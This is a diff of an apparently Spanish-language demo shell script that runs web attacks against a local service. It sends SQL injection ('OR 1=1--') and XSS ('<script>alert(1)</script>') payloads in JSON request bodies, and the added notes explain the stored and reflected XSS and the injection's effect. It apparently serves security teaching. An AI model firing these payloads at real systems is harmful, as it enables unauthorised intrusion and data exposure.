@@ -20,11 +20,12 @@ attack "Lo que guardó el servicio checkout (el script quedó sin escapar)" \
     "$BASE_URL/proxy/checkout/$SID"
 note "El valor de firstName vuelve tal cual, con las etiquetas <script> intactas: XSS almacenado."
 
-note "POST /catalog/products todavía no existe: se crea en el paso 3"
 attack "SQLi en el body JSON" \
     -X POST -H "Content-Type: application/json" -d '{"name": "x%'"'"' OR 1=1--"}' \
     "$BASE_URL/catalog/products"
+note "La inyección altera la consulta y devuelve TODOS los productos, no solo los que matchean."
 
 attack "XSS en el body JSON" \
     -X POST -H "Content-Type: application/json" -d '{"name": "<script>alert(1)</script>"}' \
     "$BASE_URL/catalog/products"
+note "El <script> vuelve en el HTML sin escapar: se ejecutaría en el navegador (XSS reflejado)."
